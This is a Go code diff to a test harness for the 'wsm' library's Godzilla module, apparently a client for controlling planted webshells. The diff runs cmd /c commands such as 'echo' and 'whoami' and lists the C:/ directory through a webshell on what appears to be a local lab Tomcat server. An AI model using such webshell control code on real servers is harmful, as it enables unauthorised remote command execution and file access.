@@ -2,9 +2,9 @@ package main
 
 import (
 	"fmt"
-	"github.com/Go0p/wsm"
-	"github.com/Go0p/wsm/lib/shell"
-	"github.com/Go0p/wsm/lib/shell/godzilla"
+	"github.com/go0p/wsm"
+	"github.com/go0p/wsm/lib/shell"
+	"github.com/go0p/wsm/lib/shell/godzilla"
 	"log"
 )
 
@@ -25,8 +25,8 @@ func main() {
 	log.SetFlags(log.Lshortfile)
 	log.Println("Jsp")
 	testJspBs64()
-	testJspRaw()
-
+	//testJspRaw()
+	//
 	//log.Println("Jspx")
 	//testJspxBs64()
 	//testJspxRaw()
@@ -38,7 +38,7 @@ func main() {
 	//log.Println("Asp")
 	//testAspBs64()
 	//testAspRaw()
-
+	//
 	//log.Println("Php")
 	//testPhpBs64()
 	//testPhpRaw()
@@ -297,12 +297,27 @@ func testJspBs64() {
 		log.Println(err)
 	}
 	fmt.Println(isAlive)
-	basicInfo1, err := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`)
+	//basic, err := g.BasicInfo()
+	//if err != nil {
+	//	log.Println(err)
+	//}
+	//fmt.Printf("%#+v\n", basic.ToMap())
+
+	cp := &godzilla.ExecParams{
+		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
+		RealCommand: `cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好 hhh"`,
+		Template:    `cmd /c "{command}"`,
+		Command:     `echo 你好`,
+	}
+	echo, err := g.CommandExec(cp)
 	if err != nil {
 		log.Println(err)
 	}
-	fmt.Printf("Info : %#+v\n", basicInfo1.ToString())
+	fmt.Printf("Echo : %#+v\n", echo.ToString())
+	fp := &godzilla.GetFiles{DirName: "C:/"}
+	getFile, err := g.OperationFile(fp)
 
+	fmt.Println("File : ", getFile.ToMap())
 	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&print 1"`)
 	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&whoami /"`)
 	//fmt.Println("Info : ", basicInfo)
@@ -335,11 +350,16 @@ func testJspRaw() {
 	}
 	fmt.Println(isAlive)
 	//basicInfo1, err := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`)
-	basicInfo1, err := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&whoami"`)
+	cp := &godzilla.ExecParams{
+		//`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&echo 你好"`
+		Template: `cmd /c "{command}"`,
+		Command:  `echo 你好`,
+	}
+	echo, err := g.CommandExec(cp)
 	if err != nil {
 		log.Println(err)
 	}
-	fmt.Printf("Info : %#+v\n", basicInfo1.ToString())
+	fmt.Printf("Echo : %#+v\n", echo.ToString())
 
 	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&print 1"`)
 	//basicInfo := g.CommandExec(`cmd /c "cd /d "C:/shells/apache-tomcat-8.5.70/bin/"&whoami /"`)
